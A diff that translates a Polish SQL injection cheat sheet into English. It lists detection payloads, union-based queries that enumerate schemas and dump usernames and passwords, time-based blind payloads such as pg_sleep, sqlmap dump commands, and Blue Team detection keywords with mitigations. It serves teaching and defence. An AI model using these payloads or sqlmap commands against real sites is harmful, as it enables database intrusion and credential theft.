@@ -12,24 +12,24 @@ author: "core"
 # SQL Injection
 
 ## TL;DR
-Niezaufany input trafia do zapytania SQL. Typy: in-band (union/error), blind (boolean/time), out-of-band. `sqlmap` do automatyzacji, ale rozumiej ręcznie.
+Untrusted input reaches a SQL query. Types: in-band (union/error), blind (boolean/time), out-of-band. `sqlmap` for automation, but understand it manually.
 
-## Wykrywanie podatności
+## Detecting the vulnerability
 ```sql
-'                       -- błąd składni?
+'                       -- syntax error?
 ' OR '1'='1             -- boolean
-1' ORDER BY 5-- -        -- liczba kolumn
+1' ORDER BY 5-- -        -- column count
 1' UNION SELECT NULL,NULL-- -
 ```
 
-## Eksploatacja (union)
+## Exploitation (union)
 ```sql
--- wersja i bazy
+-- version and databases
 ' UNION SELECT NULL,@@version-- -
 ' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -
--- kolumny tabeli
+-- table columns
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
--- dane
+-- data
 ' UNION SELECT username,password FROM users-- -
 ```
 
@@ -40,20 +40,20 @@ Niezaufany input trafia do zapytania SQL. Typy: in-band (union/error), blind (bo
 ' || pg_sleep(5)--                                 # PostgreSQL
 ```
 
-## Automatyzacja
+## Automation
 ```bash
 sqlmap -u "https://site/item?id=1" --batch --dbs
 sqlmap -r request.txt --dump -T users --threads 4
 ```
 
-## Wykrywanie (Blue Team)
-- WAF/logi: `UNION SELECT`, `information_schema`, `SLEEP(`, `WAITFOR`.
-- Anomalie: nagły wzrost błędów DB, długie czasy odpowiedzi (time-based).
+## Detection (Blue Team)
+- WAF/logs: `UNION SELECT`, `information_schema`, `SLEEP(`, `WAITFOR`.
+- Anomalies: sudden spike in DB errors, long response times (time-based).
 
-## Mitygacja / Hardening
-- **Parametryzowane zapytania / prepared statements** (podstawa).
-- ORM z bindowaniem, walidacja/allow-list inputu, least-privilege konto DB.
-- WAF jako warstwa dodatkowa, nie zamiast.
+## Mitigation / Hardening
+- **Parameterized queries / prepared statements** (the basics).
+- ORM with binding, input validation/allow-list, least-privilege DB account.
+- WAF as an extra layer, not a replacement.
 
-## Źródła
+## Sources
 - [PortSwigger – SQLi](https://portswigger.net/web-security/sql-injection) · [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
